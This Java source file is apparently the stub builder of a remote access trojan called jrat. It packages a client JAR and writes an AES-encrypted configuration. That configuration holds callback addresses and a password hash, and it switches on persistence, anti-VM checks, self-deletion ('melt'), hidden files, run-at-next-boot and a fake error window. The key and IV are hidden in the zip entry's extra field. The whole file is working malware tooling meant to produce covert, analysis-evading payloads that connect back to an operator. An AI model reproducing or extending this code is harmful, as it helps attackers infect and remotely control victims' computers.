package jrat.controller.build;

import jrat.common.codec.Base64;
import jrat.common.codec.Hex;
import jrat.common.crypto.CryptoUtils;
import jrat.common.hash.Md5;
import jrat.common.hash.Sha1;
import jrat.common.utils.DataUnits;
import jrat.controller.Constants;
import jrat.controller.ErrorDialog;
import jrat.controller.Main;
import jrat.controller.OSConfig;
import jrat.controller.listeners.BuildListener;
import jrat.controller.ui.dialogs.DialogSummary;

import javax.crypto.Cipher;
import javax.crypto.CipherOutputStream;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import javax.crypto.spec.IvParameterSpec;
import java.io.*;
import java.util.Enumeration;
import java.util.HashMap;
import java.util.Map;
import java.util.Random;
import java.util.zip.ZipEntry;
import java.util.zip.ZipException;
import java.util.zip.ZipFile;
import java.util.zip.ZipOutputStream;

public class Build {

	public static void copy(InputStream input, OutputStream output) throws Exception {
		byte[] buffer = new byte[1024];
		int bytesRead;
		while ((bytesRead = input.read(buffer)) != -1) {
			output.write(buffer, 0, bytesRead);
		}
	}

	@SuppressWarnings("resource")
	public static void build(BuildListener listener, File buildFrom, File file, String[] addresses, String id, String pass, boolean dontInstall, int droppath, int reconSec, String name, boolean fakewindow, String faketitle, String fakemessage, int fakeicon, boolean melt, boolean runNextBoot, boolean hiddenFile, boolean mutex, int mutexport, boolean timeout, int timeoutms, boolean delay, int delayms, boolean trayicon, String icon, String traymsg, String traymsgfail, String traytitle, boolean persistance, int persistancems, boolean summary, boolean antivm) {
		listener.start();
		
		if (!file.getName().toLowerCase().endsWith(".jar")) {
			file = new File(file.getAbsolutePath() + ".jar");
		}

		ZipFile inputStub = null;
		ZipOutputStream outputStub = null;
		ZipEntry entry = null;

		listener.reportProgress(5, "Preparing...", BuildStatus.INFO);

		File tempStubCleanJar = null;
		File tempCryptedNotRunnableJar = null;
		
		Sha1 sha1 = new Sha1();
		Md5 md5 = new Md5();

		try {
			
			KeyGenerator keyGen = KeyGenerator.getInstance("AES");
	        keyGen.init(128);
	        SecretKey secretKey = keyGen.generateKey();
	        byte[] key = secretKey.getEncoded();
	        IvParameterSpec iv = CryptoUtils.getRandomIv();

			File output;		

			tempStubCleanJar = File.createTempFile(Constants.NAME + "-Builder-Temp" + (new Random()).nextInt(), ".jar");
			tempCryptedNotRunnableJar = File.createTempFile(Constants.NAME + "-Builder-Installer-Temp" + (new Random()).nextInt(), ".jar");
			long start = System.currentTimeMillis();
			
			output = file;

			inputStub = new ZipFile(buildFrom);

			outputStub = new ZipOutputStream(new FileOutputStream(output));

			Enumeration<? extends ZipEntry> entries = inputStub.entries();
			while (entries.hasMoreElements()) {
				entry = entries.nextElement();
				
				InputStream inputStream = inputStub.getInputStream(entry);
				
				if (!entry.getName().equals("config.dat")) {
					listener.reportProgress(25, "Writing " + entry.getName() + " (" + inputStream.available() + " bytes)", BuildStatus.INFO);
					outputStub.putNextEntry(entry);
					if (!entry.isDirectory()) {
						copy(inputStream, outputStub);
					}
					outputStub.closeEntry();
					listener.reportProgress(50, "Wrote " + entry.getName(), BuildStatus.CHECK);
				} else {
					listener.reportProgress(50, "Skipping " + entry.getName(), BuildStatus.INFO);
				}
			}

			String addressString = "";

			for (String s : addresses) {
				addressString += s + ",";
			}
			
			if (addressString.startsWith(",")) {
				addressString = addressString.substring(1);
			}

			try {
				Cipher cipher = CryptoUtils.getBlockCipher(Cipher.ENCRYPT_MODE, secretKey, iv);
				ByteArrayOutputStream baos = new ByteArrayOutputStream();
				CipherOutputStream cios = new CipherOutputStream(baos, cipher);
				BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(cios));

				Map<String, Object> config = new HashMap<>();

				config.put("addresses", addressString);
				config.put("id", id);
				config.put("pass", sha1.hashToString(pass));
				config.put("reconsec", reconSec);
				config.put("name", name);
				config.put("mutex", mutex);
				config.put("mport", mutexport);
				config.put("timeout", timeout);
				config.put("toms", timeoutms);
				config.put("per", persistance);
				config.put("perms", persistancems);
				config.put("vm", antivm);
				config.put("ti", trayicon);
				config.put("droppath", droppath);
				config.put("melt", melt);
				config.put("window", fakewindow);
				config.put("message", fakemessage.replace("\n", "%newline%"));
				config.put("title", faketitle);
				config.put("icon", fakeicon);
				config.put("delay", delay);
				config.put("delayms", delayms);
				config.put("hiddenfile", hiddenFile);
				config.put("runnextboot", runNextBoot);
				
				if (trayicon) {
					config.put("tititle", "");
					config.put("timsg", traymsg);
					config.put("timsgfail", traymsgfail);
					config.put("tititle", traytitle);
				}			
				
				for (String str : config.keySet()) {
					writer.write(str + "=" + config.get(str).toString().replace("\n", ""));
					writer.newLine();
				}
				
				writer.close();
				
				listener.reportProgress(30, "Writing config (" + baos.toByteArray().length + " bytes)" , BuildStatus.INFO);		

				entry = new ZipEntry("config.dat");
				outputStub.putNextEntry(entry);
				
				int headerLength = key.length + iv.getIV().length;
				
				if (dontInstall) {
					headerLength++;
				}
				
				byte[] keyIv = new byte[headerLength];
				System.arraycopy(key, 0, keyIv, 0, key.length);
				System.arraycopy(iv.getIV(), 0, keyIv, 16, iv.getIV().length);
				entry.setExtra(keyIv);
				
				outputStub.write(baos.toByteArray());
				
				outputStub.closeEntry();
			} catch (Exception ex) {
                if (ex instanceof ZipException && ex.getMessage().contains("duplicate entry")) {
                    listener.reportProgress(30, "Skipped config.dat, already exists.", BuildStatus.ERROR);
                } else {
                    throw ex;
                }
            }

			listener.reportProgress(75, "Wrote key and data", BuildStatus.CHECK);

			inputStub.close();

			if (trayicon) {
				InputStream trayIcon = null;

				if (icon == null || icon.equals("default")) {
					trayIcon = Main.class.getResourceAsStream("/icon-16x16.png");
				} else {
					trayIcon = new FileInputStream(icon);
				}

				entry = new ZipEntry("icon.png");
				outputStub.putNextEntry(entry);
				copy(trayIcon, outputStub);
				outputStub.closeEntry();
			}

			inputStub.close();
			outputStub.close();		

			long end = System.currentTimeMillis();
			
			listener.reportProgress(95, "MD5 of file: " + md5.hash(file), BuildStatus.INFO);
			listener.reportProgress(95, "SHA1 of file: " + sha1.hash(file), BuildStatus.INFO);

			listener.done("Saved stub. Took " + (end - start) + " ms, size " + DataUnits.getAsString(file.length()));

			DialogSummary frame = new DialogSummary(file, addressString, pass, id, listener.getStatuses());
			frame.setVisible(true);
		} catch (Exception ex) {
			String message = ex.getMessage();
			if (message == null) {
				message = "Failed building stub";
			}
			try {
				outputStub.close();
				inputStub.close();
			} catch (Exception ex1) {
			}

			ex.printStackTrace();
			listener.fail(message);
			ErrorDialog.create(ex);
		}

		try {
			tempCryptedNotRunnableJar.delete();
			tempStubCleanJar.delete();
		} catch (Exception ex1) {
			ex1.printStackTrace();
		}
	}
}
